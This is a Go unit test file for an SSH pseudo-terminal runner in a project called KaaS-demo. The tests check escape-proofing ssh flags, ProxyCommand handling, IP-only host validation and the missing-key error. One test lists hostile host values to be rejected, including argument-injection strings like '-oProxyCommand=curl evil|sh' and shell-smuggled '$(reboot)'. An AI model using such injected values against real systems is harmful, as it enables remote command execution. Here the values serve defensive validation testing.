package sshpty

import (
	"context"
	"io"
	"log/slog"
	"strings"
	"testing"

	"github.com/Daniel-Vaz/KaaS-demo/internal/shell"
)

func testRunner() *Runner {
	return New("ssh", "kaas", "/keys/id", "", "/tmp", slog.New(slog.NewTextHandler(io.Discard, nil)))
}

// TestSSHArgsSecurityFlags: the flags that make the session escape-proof must always be present, in
// front of the host, and the host must be the final argument. If any of these regress, a user gains
// a way out of the sandbox (see the package doc).
func TestSSHArgsSecurityFlags(t *testing.T) {
	args := testRunner().sshArgs("10.0.0.5")

	joined := strings.Join(args, " ")
	for _, want := range []string{
		"-e none",                     // no ~ escape → no ssh command line
		"-F /dev/null",                // read no ssh_config
		"-i /keys/id",                 // the platform VM key
		"-l kaas",                     // the fixed login
		"-o IdentitiesOnly=yes",       // never wander to another key
		"-o BatchMode=yes",            // never prompt
		"-o StrictHostKeyChecking=no", // rebuilt nodes reuse IPs
		"-o UserKnownHostsFile=/dev/null",
	} {
		if !strings.Contains(joined, want) {
			t.Errorf("sshArgs missing %q\ngot: %s", want, joined)
		}
	}

	// The host is the LAST argument - never a flag, never mid-list where it could be read as one.
	if got := args[len(args)-1]; got != "10.0.0.5" {
		t.Errorf("last arg = %q, want the host 10.0.0.5", got)
	}
	// No ProxyCommand for a local hypervisor.
	if strings.Contains(joined, "ProxyCommand") {
		t.Errorf("local runner should not emit a ProxyCommand:\n%s", joined)
	}
}

// TestSSHArgsProxyCommand: a remote hypervisor chains the VM hop through a bastion, passed as ONE
// argv element (unquoted, since no shell interprets it).
func TestSSHArgsProxyCommand(t *testing.T) {
	r := testRunner()
	r.ProxyCommand = `ssh -W %h:%p -i /keys/kvm root@bastion`
	args := r.sshArgs("10.0.0.5")

	var found bool
	for i, a := range args {
		if a == "-o" && i+1 < len(args) && args[i+1] == "ProxyCommand="+r.ProxyCommand {
			found = true
		}
	}
	if !found {
		t.Errorf("expected a single -o ProxyCommand=<cmd> element, got: %v", args)
	}
	if args[len(args)-1] != "10.0.0.5" {
		t.Errorf("host must still be last, got %q", args[len(args)-1])
	}
}

// closedConn is a shell.Conn whose reads return EOF immediately - enough to let Serve run its
// pre-flight validation without a real terminal.
type closedConn struct{}

func (closedConn) ReadMessage() (bool, []byte, error) { return false, nil, io.EOF }
func (closedConn) WriteBinary([]byte) error           { return nil }
func (closedConn) WriteText([]byte) error             { return nil }
func (closedConn) Close() error                       { return nil }

var _ shell.Conn = closedConn{}

// TestServeRejectsNonIP is the load-bearing defence: Serve must refuse anything that is not a literal
// IP address BEFORE it ever spawns ssh, so a smuggled `-o…` can never reach the command line. Every
// case here would, unchecked, be handed to ssh as an argument.
func TestServeRejectsNonIP(t *testing.T) {
	r := testRunner()
	for _, bad := range []string{
		"",
		"not-an-ip",
		"10.0.0.5 -oProxyCommand=touch /pwned",
		"-oProxyCommand=curl evil|sh",
		"10.0.0.5;reboot",
		"$(reboot)",
		"example.com", // a hostname is not an IP - the API only ever passes resolved node IPs
	} {
		err := r.Serve(context.Background(), "cl", "vm", bad, 24, 80, closedConn{})
		if err == nil {
			t.Errorf("Serve accepted a non-IP host %q - must be rejected before spawning ssh", bad)
			continue
		}
		if !strings.Contains(err.Error(), "not a valid node IP") {
			t.Errorf("Serve(%q) error = %v, want an IP-validation error", bad, err)
		}
	}
}

// TestServeRequiresKey: a valid IP but no key is a configuration error, reported before any ssh.
func TestServeRequiresKey(t *testing.T) {
	r := testRunner()
	r.KeyFile = ""
	err := r.Serve(context.Background(), "cl", "vm", "10.0.0.5", 24, 80, closedConn{})
	if err == nil || !strings.Contains(err.Error(), "no SSH key configured") {
		t.Fatalf("Serve with no key = %v, want a missing-key error", err)
	}
}
